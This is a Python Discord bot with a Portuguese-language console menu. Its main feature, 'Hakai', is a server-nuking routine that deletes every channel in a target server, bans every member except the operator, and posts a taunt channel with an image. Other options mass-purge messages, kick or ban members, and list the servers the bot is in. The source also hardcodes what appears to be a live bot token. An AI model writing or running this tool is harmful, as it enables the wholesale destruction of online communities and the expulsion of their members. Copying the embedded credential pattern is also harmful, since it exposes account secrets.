def daimonas():
    from discord.ext import commands
    from discord.embeds import Embed
    import discord
    from time import sleep
    import os

    opp = True

    intents = discord.Intents.default()
    intents.members = True

    bot = commands.Bot(command_prefix='!', help_command=None, intents=intents)

    @bot.event
    async def on_ready():


        while True:

                os.system('clear')
                print('SEJA BEM VINDO AO MENU MESTRE DE DISCORD. Selecione uma opção:')
                print('\n[ 0 ] - Sair\n[ 1 ] - Hakai\n[ 2 ] - Deletar mensagens\n[ 3 ] - Limpar todo chat\n[ 4 ] - Expulsar membros\n[ 5 ] - banir membros\n[ 6 ] - Listar servidores\n')
                op = int (input('\nDigite o número da opção escolhida: '))
                while op < 0 or op > 6:
                    print('\nOpção inválida. Tente novamente em alguns segundos!')
                    for i in range(5, 0, -1):
                        print(i)
                        sleep(1)
                    os.system('clear')
                    print('SEJA BEM VINDO AO MENU MESTRE DE DISCORD. Selecione uma opção:')
                    print('\n[ 0 ] - Sair\n[ 1 ] - Hakai\n[ 2 ] - Deletar mensagens\n[ 3 ] - Limpar todo chat\n[ 4 ] - Expulsar membros\n[ 5 ] - banir membros\n[ 6 ] - Listar servidores\n')
                    op = int (input('\nDigite o número da opção escolhida: '))

                
                if op == 0:
                    global opp
                    opp = False
                    break

                if op == 1:
                    guild_id = int(input('Digite o id do servidor: '))
                    id_me = int(input('Digite seu id para permanecer durante o processo: '))

                    for guild in bot.guilds:
                        if guild.id == guild_id:
                            for channel in guild.channels:
                                await channel.delete()

                    #channel = discord.utils.get(guild.channels)

                    for user in guild.members:
                        try:                    
                            if user.id != id_me:
                                await user.ban()
                            else:
                                pass
                        except:
                            pass

                    await guild.create_text_channel('HAKAI')

                    for canal in guild.channels:
                        try:
                            embed = discord.Embed()
                            embed.set_image(url='https://c.tenor.com/yxszK_bph5EAAAAC/beerus-power.gif')
                            await canal.send(embed=embed)
                        except:
                            pass

                    print ('Destruição feita com sucesso, mestre!')

                    i = input('\nAperte enter para continuar.')
                    pass


                elif op == 2:
                    channel_id = input('Digite o id do canal: ')
                    channel = await bot.fetch_channel(channel_id)
                    qtd = int(input('Digite a quantidade de mensagens a ser excluidas: '))

                    if qtd == 0:
                        print('Você não exclui nenhuma mensagem!')        
                    else:
                        await channel.purge(limit=qtd)

                    print('Pronto')

                    i = input('\nAperte enter para continuar.')
                    pass


                elif op == 3:
                    channel_id = input('Digite o id do canal: ')
                    channel = await bot.fetch_channel(channel_id)
                    await channel.purge()
                    print('Chat limpo!')

                    i = input('\nAperte enter para continuar.')
                    pass

                elif op == 4:
                    guild_id = input('Digite o id do servidor: ')
                    member_id = input('Digite o id do membro a ser EXPULSO: ')
                    guild = await bot.fetch_guild(guild_id)
                    member = await bot.fetch_user(member_id)
                    try:
                        await guild.kick(member)
                    except:
                        print('Não pude expulsa-lo!')
                    print('Membro expulso!')

                    i = input('\nAperte enter para continuar.')
                    pass  

                elif op == 5:
                    guild_id = input('Digite o id do servidor: ')
                    member_id = input('Digite o id do membro a ser BANIDO: ')
                    guild = await bot.fetch_guild(guild_id)
                    member = await bot.fetch_user(member_id)
                    try:
                        await guild.ban(member)
                    except:
                        print('Não pude bani-lo!')
                    print('Membro banido!')

                    i = input('\nAperte enter para continuar.')
                    pass

                elif op == 6:
                    os.system('clear')
                    for guild in bot.guilds:
                        print(f'\n{guild.name} = {guild.id}')
                    i = input('\nAperte enter para continuar.')
                    pass

        return

    if opp == True:
        bot.run('MTAyNDY2NjY1MTc1ODcxMDg5Ng.GjIqe9.TTj7TJxcQWY2IvJaBPgeJhrbp1tzHCPm2EnlCI')
    else:
        bot.close()
        #bot.logout()
        return
    return